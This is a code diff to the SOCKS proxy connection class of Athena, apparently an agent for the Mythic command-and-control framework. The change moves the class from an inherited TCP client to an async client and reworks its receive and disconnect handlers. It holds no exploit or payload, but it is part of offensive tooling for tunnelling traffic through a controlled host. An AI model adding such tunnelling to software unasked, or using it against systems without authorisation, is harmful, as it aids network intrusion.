@@ -1,12 +1,12 @@
 ﻿using Athena.Models.Athena.Socks;
 using Athena.Models.Mythic.Response;
 using Athena.Utilities;
-using System.Net.Sockets;
-using TcpClient = Athena.Models.Athena.Socks.TcpClient;
+using System;
+using System.Threading;
 
 namespace Athena.Commands
 {
-    public class SocksConnection : TcpClient
+    public class SocksConnection
     {
         public byte[] dstportBytes { get; set; }
         public byte[] dstBytes { get; set; }
@@ -16,8 +16,11 @@ namespace Athena.Commands
         public int server_id { get; set; }
         public bool listening { get; set; }
         public bool exited { get; set; }
+        public AsyncTcpClient client { get; set; }
+        public CancellationTokenSource ct { get; set; }
 
-        public SocksConnection(ConnectionOptions co) : base(co.ip, co.port)
+
+        public SocksConnection(ConnectionOptions co)
         {
             this.dstBytes = co.dstBytes;
             this.dstportBytes = co.dstportBytes;
@@ -25,25 +28,23 @@ namespace Athena.Commands
             this.bndBytes = co.bndBytes;
             this.addressType = co.addressType;
             this.server_id = co.server_id;
+            this.client = new AsyncTcpClient();
+            this.ct = new CancellationTokenSource();
         }
 
-        protected override void OnReceived(byte[] buffer, long offset, long size)
+
+        public async void OnReceived(object sender, byte[] e)
         {
             SocksMessage smOut = new SocksMessage()
             {
                 server_id = this.server_id,
-                data = Misc.Base64Encode(buffer),
-                exit = false
+                data = await Misc.Base64Encode(e),
+                exit = this.exited
             };
             Globals.socksHandler.ReturnMessage(smOut);
         }
-        protected override void OnError(SocketError error)
-        {
-        }
-        protected override void OnConnected()
-        {
-        }
-        protected override void OnDisconnected()
+
+        internal async void OnDisconnect(object sender, EventArgs e)
         {
             SocksMessage smOut = new SocksMessage()
             {
@@ -51,8 +52,9 @@ namespace Athena.Commands
                 data = "",
                 exit = true
             };
-            Globals.socksHandler.ReturnMessage(smOut);
-            this.exited = true;
+
+            Globals.socksHandler.RemoveConnection(this.server_id);
+
         }
     }
 }
